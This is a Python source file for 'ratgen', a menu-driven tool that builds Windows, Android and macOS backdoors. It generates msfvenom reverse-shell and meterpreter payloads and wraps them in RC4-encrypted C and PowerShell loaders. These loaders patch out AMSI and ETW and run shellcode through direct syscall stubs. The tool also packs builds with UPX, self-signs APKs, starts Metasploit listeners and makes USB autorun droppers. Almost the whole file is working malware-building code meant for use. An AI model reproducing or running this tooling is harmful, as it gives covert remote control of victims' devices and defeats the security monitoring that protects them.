#!/usr/bin/env python3
"""
ratgen - payload generator and listener automation
menu-driven CLI for building Windows/Android/macOS backdoors with AV evasion.
"""

import os
import sys
import shutil
import subprocess
import tempfile
import time
from pathlib import Path

VERSION = "1.0"
BASE_DIR = Path(__file__).resolve().parent
BUILD_DIR = BASE_DIR / "build"
LISTENERS_DIR = BASE_DIR / "listeners"

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def run(cmd, **kwargs):
    printable = " ".join(str(c) for c in cmd) if isinstance(cmd, list) else cmd
    print(f"\033[90m[*] {printable}\033[0m")
    return subprocess.run(cmd, **kwargs)


def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray()
    for c in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(c ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


def byte_array(data: bytes) -> str:
    return ", ".join(f"0x{b:02x}" for b in data)


def ask(prompt, default=None):
    suffix = f" [{default}]" if default is not None else ""
    val = input(f"\033[36m{prompt}{suffix}: \033[0m").strip()
    return val if val else default


def ask_int(prompt, default=None, min_val=1, max_val=65535):
    while True:
        raw = ask(prompt, default)
        try:
            v = int(raw)
            if min_val <= v <= max_val:
                return v
            print(f"  must be between {min_val} and {max_val}")
        except (TypeError, ValueError):
            print("  enter a number")


def ask_choice(prompt, choices):
    print(f"\n{prompt}")
    for k, v in choices.items():
        print(f"  [{k}] {v}")
    while True:
        c = input("\033[36m> \033[0m").strip()
        if c in choices:
            return c
        print("  invalid choice")


def check_tool(name):
    return shutil.which(name) is not None


def require_msfvenom():
    if not check_tool("msfvenom"):
        print("\033[31m[!] msfvenom not found. install metasploit-framework.\033[0m")
        sys.exit(1)


def ensure_dirs():
    BUILD_DIR.mkdir(exist_ok=True)
    LISTENERS_DIR.mkdir(exist_ok=True)


# ---------------------------------------------------------------------------
# loader templates
# ---------------------------------------------------------------------------

X64_LOADER = r"""
#include <windows.h>
#include <stdio.h>
#include <string.h>

typedef LONG NTSTATUS;
typedef NTSTATUS (WINAPI *pNtAlloc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtWrite)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (WINAPI *pNtProtect)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (WINAPI *pNtThread)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

static unsigned char payload[] = { {{SHELLCODE}} };
static unsigned char key[] = { {{KEY}} };

static void rc4(unsigned char* data, DWORD len, const unsigned char* k, DWORD klen) {
    unsigned char S[256];
    int i, j = 0;
    unsigned char t;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + k[i % klen]) & 0xFF;
        t = S[i]; S[i] = S[j]; S[j] = t;
    }
    i = j = 0;
    for (DWORD n = 0; n < len; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        t = S[i]; S[i] = S[j]; S[j] = t;
        data[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

static DWORD rva_to_offset(unsigned char* buf, DWORD rva) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (rva >= sec[i].VirtualAddress && rva < sec[i].VirtualAddress + sec[i].SizeOfRawData)
            return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
    }
    return 0;
}

static DWORD get_ssn(const char* funcname, unsigned char* buf, DWORD size) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)buf;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(buf + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exp_off = rva_to_offset(buf, exp_rva);
    if (!exp_off) return 0;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(buf + exp_off);
    DWORD names_off = rva_to_offset(buf, exp->AddressOfNames);
    DWORD ords_off = rva_to_offset(buf, exp->AddressOfNameOrdinals);
    DWORD funcs_off = rva_to_offset(buf, exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        DWORD name_rva = *(DWORD*)(buf + names_off + i * 4);
        DWORD name_off = rva_to_offset(buf, name_rva);
        if (strcmp((const char*)(buf + name_off), funcname) == 0) {
            WORD ord = *(WORD*)(buf + ords_off + i * 2);
            DWORD func_rva = *(DWORD*)(buf + funcs_off + ord * 4);
            DWORD func_off = rva_to_offset(buf, func_rva);
            unsigned char* fa = buf + func_off;
            if (fa[0] == 0x4C && fa[1] == 0x8B && fa[2] == 0xD1 && fa[3] == 0xB8)
                return *(DWORD*)(fa + 4);
            return 0;
        }
    }
    return 0;
}

static void* build_stub(DWORD ssn) {
    unsigned char stub[] = {
        0x4C, 0x8B, 0xD1,
        0xB8, 0x00, 0x00, 0x00, 0x00,
        0x0F, 0x05,
        0xC3
    };
    *(DWORD*)(stub + 4) = ssn;
    void* mem = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;
    memcpy(mem, stub, sizeof(stub));
    return mem;
}

static void patch_amsi_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        void* etw = (void*)GetProcAddress(ntdll, "EtwEventWrite");
        if (etw) {
            DWORD old;
            VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
            *(unsigned char*)etw = 0xC3;
            VirtualProtect(etw, 1, old, &old);
        }
    }
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (amsi) {
        void* scan = (void*)GetProcAddress(amsi, "AmsiScanBuffer");
        if (scan) {
            DWORD old;
            VirtualProtect(scan, 1, PAGE_EXECUTE_READWRITE, &old);
            *(unsigned char*)scan = 0xC3;
            VirtualProtect(scan, 1, old, &old);
        }
    }
}

static DWORD WINAPI run_payload(LPVOID lpParam) {
    patch_amsi_etw();
    rc4(payload, sizeof(payload), key, sizeof(key));

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;
    DWORD ntdll_size = GetFileSize(hFile, NULL);
    unsigned char* buf = (unsigned char*)malloc(ntdll_size);
    DWORD read = 0;
    ReadFile(hFile, buf, ntdll_size, &read, NULL);
    CloseHandle(hFile);

    DWORD ssn_alloc = get_ssn("NtAllocateVirtualMemory", buf, ntdll_size);
    DWORD ssn_write = get_ssn("NtWriteVirtualMemory", buf, ntdll_size);
    DWORD ssn_protect = get_ssn("NtProtectVirtualMemory", buf, ntdll_size);
    DWORD ssn_thread = get_ssn("NtCreateThreadEx", buf, ntdll_size);
    free(buf);

    if (!ssn_alloc || !ssn_write || !ssn_protect || !ssn_thread) return 2;

    pNtAlloc NtAlloc = (pNtAlloc)build_stub(ssn_alloc);
    pNtWrite NtWrite = (pNtWrite)build_stub(ssn_write);
    pNtProtect NtProtect = (pNtProtect)build_stub(ssn_protect);
    pNtThread NtThread = (pNtThread)build_stub(ssn_thread);

    PVOID base = NULL;
    SIZE_T sz = sizeof(payload);
    if (NtAlloc(GetCurrentProcess(), &base, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) < 0) return 3;
    if (NtWrite(GetCurrentProcess(), base, payload, sizeof(payload), &sz) < 0) return 4;
    DWORD old = 0;
    if (NtProtect(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READ, &old) < 0) return 5;

    HANDLE hThread = NULL;
    if (NtThread(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), base, NULL, 0, 0, 0, 0, NULL) < 0) return 6;
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}

#ifdef BUILD_DLL
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CreateThread(NULL, 0, run_payload, NULL, 0, NULL);
    }
    return TRUE;
}
#else
int WINAPI WinMain(HINSTANCE h, HINSTANCE hp, LPSTR cmd, int show) {
    run_payload();
    return 0;
}
#endif
"""

X86_LOADER = r"""
#include <windows.h>
#include <stdio.h>
#include <string.h>

typedef LONG NTSTATUS;
typedef NTSTATUS (WINAPI *pNtAlloc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtWrite)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (WINAPI *pNtProtect)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (WINAPI *pNtThread)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

static unsigned char payload[] = { {{SHELLCODE}} };
static unsigned char key[] = { {{KEY}} };

static void rc4(unsigned char* data, DWORD len, const unsigned char* k, DWORD klen) {
    unsigned char S[256];
    int i, j = 0;
    unsigned char t;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + k[i % klen]) & 0xFF;
        t = S[i]; S[i] = S[j]; S[j] = t;
    }
    i = j = 0;
    for (DWORD n = 0; n < len; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        t = S[i]; S[i] = S[j]; S[j] = t;
        data[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

static void patch_amsi_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        void* etw = (void*)GetProcAddress(ntdll, "EtwEventWrite");
        if (etw) {
            DWORD old;
            VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
            *(unsigned char*)etw = 0xC3;
            VirtualProtect(etw, 1, old, &old);
        }
    }
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (amsi) {
        void* scan = (void*)GetProcAddress(amsi, "AmsiScanBuffer");
        if (scan) {
            DWORD old;
            VirtualProtect(scan, 1, PAGE_EXECUTE_READWRITE, &old);
            *(unsigned char*)scan = 0xC3;
            VirtualProtect(scan, 1, old, &old);
        }
    }
}

static DWORD WINAPI run_payload(LPVOID lpParam) {
    patch_amsi_etw();
    rc4(payload, sizeof(payload), key, sizeof(key));

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtAlloc NtAlloc = (pNtAlloc)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    pNtWrite NtWrite = (pNtWrite)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    pNtProtect NtProtect = (pNtProtect)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    pNtThread NtThread = (pNtThread)GetProcAddress(ntdll, "NtCreateThreadEx");

    PVOID base = NULL;
    SIZE_T sz = sizeof(payload);
    if (NtAlloc(GetCurrentProcess(), &base, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) < 0) return 3;
    if (NtWrite(GetCurrentProcess(), base, payload, sizeof(payload), &sz) < 0) return 4;
    DWORD old = 0;
    if (NtProtect(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READ, &old) < 0) return 5;

    HANDLE hThread = NULL;
    if (NtThread(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), base, NULL, 0, 0, 0, 0, NULL) < 0) return 6;
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}

#ifdef BUILD_DLL
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CreateThread(NULL, 0, run_payload, NULL, 0, NULL);
    }
    return TRUE;
}
#else
int WINAPI WinMain(HINSTANCE h, HINSTANCE hp, LPSTR cmd, int show) {
    run_payload();
    return 0;
}
#endif
"""

PS1_LOADER = r"""
$k = [byte[]]({{KEY}})
$e = [byte[]]({{SHELLCODE}})
$S = 0..255
$j = 0
for ($i = 0; $i -lt 256; $i++) {
    $j = ($j + $S[$i] + $k[$i % $k.Length]) % 256
    $t = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $t
}
$i = 0; $j = 0
for ($n = 0; $n -lt $e.Length; $n++) {
    $i = ($i + 1) % 256
    $j = ($j + $S[$i]) % 256
    $t = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $t
    $e[$n] = $e[$n] -bxor $S[($S[$i] + $S[$j]) % 256]
}
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class W {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
}
"@
$addr = [W]::VirtualAlloc([IntPtr]::Zero, [uint32]$e.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($e, 0, $addr, $e.Length)
$th = [W]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[W]::WaitForSingleObject($th, 0xFFFFFFFF)
"""


def render_loader(template, shellcode: bytes, key: bytes) -> str:
    return (template
            .replace("{{SHELLCODE}}", byte_array(shellcode))
            .replace("{{KEY}}", byte_array(key)))


# ---------------------------------------------------------------------------
# windows builder
# ---------------------------------------------------------------------------

def build_windows():
    print("\n=== Windows payload ===")
    arch = ask_choice("Architecture:", {"1": "x64", "2": "x86"})
    payload_kind = ask_choice("Payload type:", {"1": "shell (raw cmd)", "2": "meterpreter"})
    fmt = ask_choice("Output format:", {
        "1": "exe (compiled loader)",
        "2": "dll (compiled loader)",
        "3": "raw shellcode",
        "4": "ps1 (powershell loader)",
    })
    lhost = ask("LHOST (ip or domain)")
    lport = ask_int("LPORT", 4444)
    name = ask("Output name", "payload")
    name = name.replace(".exe", "").replace(".dll", "")

    if not lhost:
        print("lhost required")
        return

    require_msfvenom()

    plat = "windows/x64" if arch == "1" else "windows"
    kind = "shell" if payload_kind == "1" else "meterpreter"
    payload_name = f"{plat}/{kind}/reverse_tcp"

    raw_file = BUILD_DIR / f"{name}.bin"
    print(f"\n[*] generating shellcode: {payload_name}")
    r = run(["msfvenom", "-p", payload_name, f"LHOST={lhost}", f"LPORT={lport}",
             "-f", "raw", "-o", str(raw_file)], capture_output=True)
    if r.returncode != 0:
        print(r.stderr.decode())
        return
    shellcode = raw_file.read_bytes()
    print(f"[+] shellcode: {len(shellcode)} bytes")

    if fmt == "3":
        out = BUILD_DIR / f"{name}_raw.bin"
        shutil.copy(raw_file, out)
        print(f"\n[+] raw shellcode: {out}")
        return

    key = os.urandom(16)
    enc = rc4(shellcode, key)

    if fmt == "4":
        src = render_loader(PS1_LOADER, enc, key)
        out = BUILD_DIR / f"{name}.ps1"
        out.write_text(src)
        print(f"\n[+] powershell loader: {out}")
        return

    if arch == "1":
        template = X64_LOADER
        compiler = "x86_64-w64-mingw32-gcc"
    else:
        template = X86_LOADER
        compiler = "i686-w64-mingw32-gcc"

    if not check_tool(compiler):
        print(f"\033[31m[!] {compiler} not found. install mingw-w64.\033[0m")
        return

    src = render_loader(template, enc, key)
    c_file = BUILD_DIR / f"{name}.c"
    c_file.write_text(src)

    if fmt == "1":
        out = BUILD_DIR / f"{name}.exe"
        extra = ["-mwindows"]
        defines = []
    else:
        out = BUILD_DIR / f"{name}.dll"
        extra = ["-shared"]
        defines = ["-DBUILD_DLL"]

    print(f"\n[*] compiling {out.name}")
    r = run([compiler, "-O2", "-s", "-o", str(out), str(c_file)] + defines + extra,
            capture_output=True)
    if r.returncode != 0:
        print(r.stderr.decode())
        return

    if check_tool("upx"):
        print("[*] packing with upx")
        run(["upx", "--ultra-brute", "-q", str(out)], capture_output=True)

    print(f"\n\033[32m[+] built: {out}\033[0m")
    print(f"[+] size: {out.stat().st_size} bytes")


# ---------------------------------------------------------------------------
# android builder
# ---------------------------------------------------------------------------

def build_android():
    print("\n=== Android payload ===")
    lhost = ask("LHOST (ip or domain)")
    lport = ask_int("LPORT", 4444)
    name = ask("Output name", "payload")

    if not lhost:
        print("lhost required")
        return

    require_msfvenom()

    out = BUILD_DIR / f"{name}.apk"
    print("\n[*] generating android meterpreter apk")
    r = run(["msfvenom", "-p", "android/meterpreter/reverse_tcp",
             f"LHOST={lhost}", f"LPORT={lport}", "-o", str(out)], capture_output=True)
    if r.returncode != 0:
        print(r.stderr.decode())
        return

    # sign
    if check_tool("apksigner"):
        ks = BUILD_DIR / "ratgen.keystore"
        if not ks.exists():
            run(["keytool", "-genkeypair", "-v", "-keystore", str(ks),
                 "-alias", "ratgen", "-keyalg", "RSA", "-keysize", "2048",
                 "-validity", "10000", "-storepass", "ratgen", "-keypass", "ratgen",
                 "-dname", "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"],
                capture_output=True)
        print("[*] signing apk")
        run(["apksigner", "sign", "--ks", str(ks), "--ks-pass", "pass:ratgen",
             "--key-pass", "pass:ratgen", str(out)], capture_output=True)
    elif check_tool("jarsigner"):
        print("[*] signing with jarsigner (no apksigner)")
        ks = BUILD_DIR / "ratgen.keystore"
        if not ks.exists():
            run(["keytool", "-genkeypair", "-keystore", str(ks), "-alias", "ratgen",
                 "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000",
                 "-storepass", "ratgen", "-keypass", "ratgen",
                 "-dname", "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"],
                capture_output=True)
        run(["jarsigner", "-keystore", str(ks), "-storepass", "ratgen",
             "-keypass", "ratgen", str(out), "ratgen"], capture_output=True)

    print(f"\n\033[32m[+] built: {out}\033[0m")
    print(f"[+] size: {out.stat().st_size} bytes")


# ---------------------------------------------------------------------------
# mac builder
# ---------------------------------------------------------------------------

def build_mac():
    print("\n=== macOS payload ===")
    payload_kind = ask_choice("Payload type:", {"1": "shell (raw cmd)", "2": "meterpreter"})
    lhost = ask("LHOST (ip or domain)")
    lport = ask_int("LPORT", 4444)
    name = ask("Output name", "payload")

    if not lhost:
        print("lhost required")
        return

    require_msfvenom()

    kind = "shell" if payload_kind == "1" else "meterpreter"
    payload_name = f"osx/x64/{kind}/reverse_tcp"

    raw = BUILD_DIR / f"{name}_mac.bin"
    print(f"\n[*] generating {payload_name}")
    r = run(["msfvenom", "-p", payload_name, f"LHOST={lhost}", f"LPORT={lport}",
             "-f", "macho", "-o", str(raw)], capture_output=True)
    if r.returncode != 0:
        print(r.stderr.decode())
        return

    # app bundle
    app_dir = BUILD_DIR / f"{name}.app" / "Contents" / "MacOS"
    app_dir.mkdir(parents=True, exist_ok=True)
    bin_path = app_dir / name
    shutil.copy(raw, bin_path)
    os.chmod(bin_path, 0o755)

    plist = BUILD_DIR / f"{name}.app" / "Contents" / "Info.plist"
    plist.write_text(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>{name}</string>
    <key>CFBundleIdentifier</key>
    <string>com.{name}.app</string>
    <key>CFBundleName</key>
    <string>{name}</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
</dict>
</plist>
""")

    # bare binary
    bare = BUILD_DIR / f"{name}_mac"
    shutil.copy(raw, bare)
    os.chmod(bare, 0o755)

    print(f"\n\033[32m[+] built app bundle: {BUILD_DIR / f'{name}.app'}\033[0m")
    print(f"\033[32m[+] built bare binary: {bare}\033[0m")


# ---------------------------------------------------------------------------
# listener
# ---------------------------------------------------------------------------

def start_listener():
    print("\n=== Listener ===")
    kind = ask_choice("Listener type:", {
        "1": "simple tcp (shell payloads)",
        "2": "meterpreter (msfconsole)",
    })
    lhost = ask("Listen host", "0.0.0.0")
    lport = ask_int("Listen port", 4444)

    if kind == "1":
        listener = LISTENERS_DIR / "simple_listener.py"
        if not listener.exists():
            print("[!] simple_listener.py missing in listeners/")
            return
        print(f"\n[*] starting simple listener on {lhost}:{lport}")
        os.execv(sys.executable, [sys.executable, str(listener), lhost, str(lport)])
    else:
        arch = ask_choice("Payload arch:", {"1": "windows/x64", "2": "windows", "3": "osx/x64", "4": "android"})
        plat = {"1": "windows/x64", "2": "windows", "3": "osx/x64", "4": "android"}[arch]
        rc = BUILD_DIR / "handler.rc"
        rc.write_text(f"""use exploit/multi/handler
set PAYLOAD {plat}/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set AutoRunScript post/multi/manage/shell_to_meterpreter
exploit -j
""")
        print(f"\n[*] launching msfconsole with {rc}")
        os.execvp("msfconsole", ["msfconsole", "-q", "-r", str(rc)])


# ---------------------------------------------------------------------------
# usb autorun package
# ---------------------------------------------------------------------------

def build_autorun():
    print("\n=== USB autorun package ===")
    target = ask_choice("Target OS:", {"1": "Windows", "2": "macOS"})
    src = ask("Path to existing payload binary")
    if not src or not Path(src).exists():
        print("[!] payload path invalid")
        return

    src = Path(src)
    pkg = BUILD_DIR / "usb_package"
    pkg.mkdir(exist_ok=True)
    shutil.copy(src, pkg / src.name)

    if target == "1":
        (pkg / "autorun.inf").write_text(f"""[autorun]
open={src.name}
icon={src.name}
label=USB
""")
        print(f"\n\033[32m[+] windows autorun package: {pkg}\033[0m")
        print("[*] note: modern windows blocks autorun from removable drives by default")
    else:
        cmd = pkg / "open.command"
        cmd.write_text(f"""#!/bin/bash
DIR="$(cd "$(dirname "$0")" && pwd)"
"$DIR/{src.name}" &
""")
        os.chmod(cmd, 0o755)
        print(f"\n\033[32m[+] mac autorun package: {pkg}\033[0m")
        print("[*] user must double-click open.command; gatekeeper will prompt")


# ---------------------------------------------------------------------------
# dependency check
# ---------------------------------------------------------------------------

def deps():
    print("\n=== Dependency check ===")
    tools = {
        "x86_64-w64-mingw32-gcc": "mingw-w64 (x64)",
        "i686-w64-mingw32-gcc": "mingw-w64 (x86)",
        "msfvenom": "metasploit-framework",
        "upx": "upx-ucl",
        "apksigner": "android-sdk-build-tools",
        "jarsigner": "default-jdk",
        "keytool": "default-jdk",
    }
    for tool, pkg in tools.items():
        status = "\033[32m[ok]\033[0m" if check_tool(tool) else "\033[31m[missing]\033[0m"
        print(f"  {status} {tool}  ({pkg})")


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

BANNER = r"""
\033[35m
  ██████╗  █████╗ ████████╗ ██████╗ ███████╗███╗   ██╗
  ██╔══██╗██╔══██╗╚══██╔══╝██╔════╝ ██╔════╝████╗  ██║
  ██████╔╝███████║   ██║   ██║  ███╗█████╗  ██╔██╗ ██║
  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══╝  ██║╚██╗██║
  ██║  ██║██║  ██║   ██║   ╚██████╔╝███████╗██║ ╚████║
  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═══╝
\033[0m
  payload generator + listener automation  v{VERSION}
"""


def main():
    ensure_dirs()
    print(BANNER.format(VERSION=VERSION))
    while True:
        print("\n\033[36m=== main menu ===\033[0m")
        print("  [1] Windows payload")
        print("  [2] Android payload")
        print("  [3] macOS payload")
        print("  [4] Start listener")
        print("  [5] Generate USB autorun package")
        print("  [6] Check dependencies")
        print("  [7] Exit")
        c = input("\033[36m> \033[0m").strip()
        if c == "1":
            build_windows()
        elif c == "2":
            build_android()
        elif c == "3":
            build_mac()
        elif c == "4":
            start_listener()
        elif c == "5":
            build_autorun()
        elif c == "6":
            deps()
        elif c == "7":
            print("bye.")
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\ninterrupted.")
        sys.exit(0)